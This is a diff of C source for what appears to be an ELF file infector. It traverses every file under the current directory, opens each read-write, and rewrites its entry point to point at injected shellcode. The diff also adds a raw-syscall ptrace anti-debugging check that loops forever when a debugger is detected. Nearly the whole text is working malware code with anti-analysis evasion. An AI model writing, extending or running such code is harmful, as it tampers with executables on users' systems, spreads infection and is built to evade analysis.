@@ -8,7 +8,6 @@
 #include <stdlib.h>
 #include <elf.h>
 #include <fcntl.h>
-#define ROOT_DIR   (".")
 #define SPARE_FDS  (4)
 #define MAX_FDS    (512)
 
@@ -56,9 +55,6 @@ typedef struct temp_Elf64_Ehdr{
 } temp_Elf64_Ehdr;//Elf64_Ehdr;
 
 
-int activate(){
-    return 1; // 
-}
 
 void my_memcpy(char* d, char* s, int l){
     int i=0;
@@ -127,6 +123,17 @@ static inline int my_lseek(int fd, int offset, int origin){
    return ret;
 }
 
+int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data){
+   long long ret;
+   asm("mov %0, %%rdi"::"r"((long)request));
+   asm("mov %0, %%rsi"::"r"((long)pid));
+   asm("mov %0, %%rdx"::"r"((long)addr));
+   asm("mov %0, %%r10"::"r"((long)data));
+   asm("mov $101, %rax");
+   asm("syscall");
+   asm("mov %%rax, %0":"=r"(ret));
+   return ret; // under debugging : -? / normal : 0
+}
 
 void change_entrypoint(const char* fpath){
 	int fd, i, shellcodeloc;
@@ -142,10 +149,7 @@ void change_entrypoint(const char* fpath){
 		printf("[ERROR] Permission error(%s)\n",fpath);
 		return 0;
 	}
-	if(!activate()){
-		printf("[ERROR] Debugger detected(%s)\n",fpath);
-		return 0;
-	}
+
 	fd = my_open(fpath, 2); // O_RDWR = 2
 	if (fd < 0){
 		printf("[ERROR] fd error(%s)\n",fpath);
@@ -252,24 +256,27 @@ void change_entrypoint(const char* fpath){
 
 int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
     int ret = 0;
-    if (flag == FTW_F && activate()) {
+    if (flag == FTW_F) {
 		change_entrypoint(fpath);
 		printf("\n");
 	}
     return ret;
-}
+} 
 
 int main(int argc, char* argv[])
 {
     struct timeval t;
     int nfds = getdtablesize() - SPARE_FDS;
     nfds = nfds > MAX_FDS ? MAX_FDS : nfds;
-
+ 
+	if(my_ptraceme(0,0,0,0)!=0){
+		printf("[ERROR] Debugger detected!\n");
+		while(1);
+		return 0;
+	}
     gettimeofday(&t, NULL);
     srand(t.tv_usec * t.tv_sec);
-    nftw(ROOT_DIR, file_process, nfds, FTW_PHYS);
+    nftw(".", file_process, nfds, FTW_PHYS);
     exit(0);
 }
-//ls new entry point : 0x61feb8?
-
 
